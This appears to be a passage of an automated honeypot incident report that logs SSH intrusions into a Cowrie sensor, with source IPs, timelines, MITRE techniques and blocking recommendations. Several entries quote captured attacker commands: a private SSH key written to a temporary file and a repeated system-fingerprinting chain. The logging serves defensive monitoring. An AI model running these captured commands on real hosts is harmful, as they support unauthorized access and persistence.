| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:35:30` | `cowrie.session.connect` |
| `2026-08-21 05:35:30` | `cowrie.client.version` |
| `2026-08-21 05:35:30` | `cowrie.client.kex` |
| `2026-08-21 05:35:30` | `cowrie.login.success` |
| `2026-08-21 05:35:32` | `cowrie.session.params` |
| `2026-08-21 05:35:32` | `cowrie.command.input` |
| `2026-08-21 05:35:32` | `cowrie.session.file_download` |
| `2026-08-21 05:35:32` | `cowrie.session.file_download` |
| `2026-08-21 05:35:32` | `cowrie.log.closed` |
| `2026-08-21 05:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-623787648555

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-08-21 05:36 |
| **Last Seen** | 2026-08-21 05:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:36:24` | `cowrie.session.connect` |
| `2026-08-21 05:36:24` | `cowrie.client.version` |
| `2026-08-21 05:36:24` | `cowrie.client.kex` |
| `2026-08-21 05:36:27` | `cowrie.login.success` |
| `2026-08-21 05:36:28` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db5e0086b2e2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:36 |
| **Last Seen** | 2026-08-21 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:36:26` | `cowrie.session.connect` |
| `2026-08-21 05:36:26` | `cowrie.client.version` |
| `2026-08-21 05:36:26` | `cowrie.client.kex` |
| `2026-08-21 05:36:27` | `cowrie.login.success` |
| `2026-08-21 05:36:27` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:36:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:36:27` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf44b229b04

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:36 |
| **Last Seen** | 2026-08-21 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:36:29` | `cowrie.session.connect` |
| `2026-08-21 05:36:29` | `cowrie.client.version` |
| `2026-08-21 05:36:29` | `cowrie.client.kex` |
| `2026-08-21 05:36:30` | `cowrie.login.success` |
| `2026-08-21 05:36:31` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:36:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:36:31` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b497ee53110a

| Field | Detail |
|---|---|
| **Source IP** | `27.39.130[.]144` |
| **First Seen** | 2026-08-21 05:36 |
| **Last Seen** | 2026-08-21 05:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:36:33` | `cowrie.session.connect` |
| `2026-08-21 05:36:35` | `cowrie.client.version` |
| `2026-08-21 05:36:35` | `cowrie.client.kex` |
| `2026-08-21 05:36:38` | `cowrie.login.success` |
| `2026-08-21 05:36:38` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.39.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.39.130[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7ed1c83428

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-21 05:37 |
| **Last Seen** | 2026-08-21 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:37:11` | `cowrie.session.connect` |
| `2026-08-21 05:37:11` | `cowrie.client.version` |
| `2026-08-21 05:37:11` | `cowrie.client.kex` |
| `2026-08-21 05:37:12` | `cowrie.login.success` |
| `2026-08-21 05:37:12` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:37:12` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b2608aaf63f

| Field | Detail |
|---|---|
| **Source IP** | `112.26.99[.]93` |
| **First Seen** | 2026-08-21 05:38 |
| **Last Seen** | 2026-08-21 05:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:38:50` | `cowrie.session.connect` |
| `2026-08-21 05:38:50` | `cowrie.client.version` |
| `2026-08-21 05:38:50` | `cowrie.client.kex` |
| `2026-08-21 05:38:53` | `cowrie.login.success` |
| `2026-08-21 05:38:54` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.99[.]93` to AbuseIPDB if not already reported
- [ ] Block `112.26.99[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99fa89dedf9

| Field | Detail |
|---|---|
| **Source IP** | `1.233.103[.]18` |
| **First Seen** | 2026-08-21 05:38 |
| **Last Seen** | 2026-08-21 05:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:38:59` | `cowrie.session.connect` |
| `2026-08-21 05:39:00` | `cowrie.client.version` |
| `2026-08-21 05:39:00` | `cowrie.client.kex` |
| `2026-08-21 05:39:02` | `cowrie.login.success` |
| `2026-08-21 05:39:03` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.233.103[.]18` to AbuseIPDB if not already reported
- [ ] Block `1.233.103[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0adfa5fedfb3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:39 |
| **Last Seen** | 2026-08-21 05:39 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:39:14` | `cowrie.session.connect` |
| `2026-08-21 05:39:17` | `cowrie.client.version` |
| `2026-08-21 05:39:17` | `cowrie.client.kex` |
| `2026-08-21 05:39:43` | `cowrie.login.success` |
| `2026-08-21 05:39:45` | `cowrie.session.params` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.success` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:45` | `cowrie.command.input` |
| `2026-08-21 05:39:46` | `cowrie.log.closed` |
| `2026-08-21 05:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707211cbdb03

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:43 |
| **Last Seen** | 2026-08-21 05:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:43:10` | `cowrie.session.connect` |
| `2026-08-21 05:43:11` | `cowrie.client.version` |
| `2026-08-21 05:43:11` | `cowrie.client.kex` |
| `2026-08-21 05:43:14` | `cowrie.login.success` |
| `2026-08-21 05:43:17` | `cowrie.session.params` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.success` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:17` | `cowrie.command.input` |
| `2026-08-21 05:43:18` | `cowrie.log.closed` |
| `2026-08-21 05:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701aede1e079

| Field | Detail |
|---|---|
| **Source IP** | `16.171.111[.]127` |
| **First Seen** | 2026-08-21 05:43 |
| **Last Seen** | 2026-08-21 05:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:43:44` | `cowrie.session.connect` |
| `2026-08-21 05:43:44` | `cowrie.client.version` |
| `2026-08-21 05:43:44` | `cowrie.client.kex` |
| `2026-08-21 05:43:45` | `cowrie.login.success` |
| `2026-08-21 05:43:45` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `16.171.111[.]127` to AbuseIPDB if not already reported
- [ ] Block `16.171.111[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64faff03c36

| Field | Detail |
|---|---|
| **Source IP** | `218.102.209[.]81` |
| **First Seen** | 2026-08-21 05:43 |
| **Last Seen** | 2026-08-21 05:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:43:50` | `cowrie.session.connect` |
| `2026-08-21 05:43:52` | `cowrie.client.version` |
| `2026-08-21 05:43:52` | `cowrie.client.kex` |
| `2026-08-21 05:43:55` | `cowrie.login.success` |
| `2026-08-21 05:43:55` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.102.209[.]81` to AbuseIPDB if not already reported
- [ ] Block `218.102.209[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a08b1a152f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:46 |
| **Last Seen** | 2026-08-21 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:46:00` | `cowrie.session.connect` |
| `2026-08-21 05:46:00` | `cowrie.client.version` |
| `2026-08-21 05:46:00` | `cowrie.client.kex` |
| `2026-08-21 05:46:01` | `cowrie.login.success` |
| `2026-08-21 05:46:01` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:46:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:46:02` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d789fd0f7e88

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:46 |
| **Last Seen** | 2026-08-21 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:46:04` | `cowrie.session.connect` |
| `2026-08-21 05:46:04` | `cowrie.client.version` |
| `2026-08-21 05:46:04` | `cowrie.client.kex` |
| `2026-08-21 05:46:05` | `cowrie.login.success` |
| `2026-08-21 05:46:05` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:46:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:46:05` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e1e0ee9ebd1

| Field | Detail |
|---|---|
| **Source IP** | `219.143.40[.]210` |
| **First Seen** | 2026-08-21 05:46 |
| **Last Seen** | 2026-08-21 05:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:46:08` | `cowrie.session.connect` |
| `2026-08-21 05:46:09` | `cowrie.client.version` |
| `2026-08-21 05:46:09` | `cowrie.client.kex` |
| `2026-08-21 05:46:12` | `cowrie.login.success` |
| `2026-08-21 05:46:13` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:46:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.143.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `219.143.40[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4813bbcbfcb

| Field | Detail |
|---|---|
| **Source IP** | `82.181.235[.]31` |
| **First Seen** | 2026-08-21 05:46 |
| **Last Seen** | 2026-08-21 05:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:46:18` | `cowrie.session.connect` |
| `2026-08-21 05:46:18` | `cowrie.client.version` |
| `2026-08-21 05:46:18` | `cowrie.client.kex` |
| `2026-08-21 05:46:20` | `cowrie.login.success` |
| `2026-08-21 05:46:20` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.181.235[.]31` to AbuseIPDB if not already reported
- [ ] Block `82.181.235[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f6b03fb570

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:46 |
| **Last Seen** | 2026-08-21 05:47 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:46:59` | `cowrie.session.connect` |
| `2026-08-21 05:47:01` | `cowrie.client.version` |
| `2026-08-21 05:47:01` | `cowrie.client.kex` |
| `2026-08-21 05:47:09` | `cowrie.login.success` |
| `2026-08-21 05:47:12` | `cowrie.session.params` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.success` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:12` | `cowrie.command.input` |
| `2026-08-21 05:47:14` | `cowrie.log.closed` |
| `2026-08-21 05:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19a062745142

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:50 |
| **Last Seen** | 2026-08-21 05:51 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:50:48` | `cowrie.session.connect` |
| `2026-08-21 05:50:50` | `cowrie.client.version` |
| `2026-08-21 05:50:50` | `cowrie.client.kex` |
| `2026-08-21 05:50:57` | `cowrie.login.success` |
| `2026-08-21 05:51:00` | `cowrie.session.params` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.success` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:00` | `cowrie.command.input` |
| `2026-08-21 05:51:02` | `cowrie.log.closed` |
| `2026-08-21 05:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7c62810409

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-08-21 05:53 |
| **Last Seen** | 2026-08-21 05:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:53:36` | `cowrie.session.connect` |
| `2026-08-21 05:53:36` | `cowrie.client.version` |
| `2026-08-21 05:53:36` | `cowrie.client.kex` |
| `2026-08-21 05:53:37` | `cowrie.login.success` |
| `2026-08-21 05:53:38` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6ca296a175

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-08-21 05:53 |
| **Last Seen** | 2026-08-21 05:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:53:43` | `cowrie.session.connect` |
| `2026-08-21 05:53:43` | `cowrie.client.version` |
| `2026-08-21 05:53:43` | `cowrie.client.kex` |
| `2026-08-21 05:53:45` | `cowrie.login.success` |
